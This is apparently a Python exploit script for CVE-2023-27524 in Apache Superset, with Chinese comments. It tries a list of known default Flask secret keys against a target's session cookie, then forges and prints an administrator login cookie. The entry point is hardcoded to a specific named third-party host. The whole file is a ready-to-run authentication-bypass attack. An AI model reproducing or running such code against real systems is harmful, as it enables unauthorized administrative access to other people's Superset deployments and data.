###superset未授权访问漏洞
###writer： summerainX
###脚本使用方式 python CVE-2023-27524.py -u  url


from flask_unsign import session
import requests
import urllib3
import argparse
import re
from time import sleep
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


SECRET_KEYS = [
    b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',  # version < 1.4.1
    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1
    b'thisISaSECRET_1234',                            # deployment template
    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation
    b'TEST_NON_DEV_SECRET'                            # docker compose
]

# 确认版本
def get_cookie(url):
    url = url.rstrip('/') + '/login/'
    try:
        resp = requests.get(url,verify=False)
        #print(resp.text)
        if resp.status_code != 200:
            print("无法确定superset版本！ unidentified version！")
            return None
        else:
            version = re.search('version_string&#34;: &#34;(.*?)&#34;',resp.text).group(1)
            print("superset版本："+version)
            try:
                cookie = resp.cookies['session']
                #print(cookie)
            except:
                print("无法获取有效cookie！  Cannot get a valid cookie！ ")
                return None
            session.decode(cookie)
            for key in SECRET_KEYS:
                cracked = session.verify(cookie, key)
                if cracked:
                    break
            if not cracked:
                print("无法解密cookie")
                return None
            print("使用的解密key："+key.decode())
            forged_cookie = session.sign({'_user_id': 1, 'user_id': 1}, key)
            print("可用的登录cookie:"+forged_cookie)
            return 
    except:
        print("无法访问该网站！ Cannot access the page！")
        return None



if __name__ == '__main__':
    # parser = argparse.ArgumentParser()
    # parser.add_argument('--url', '-u', help='请输入url地址', required=True)   
    # args = parser.parse_args()
    # get_cookie(args.url)
    get_cookie("https://test-superset.lingoace-inc.com")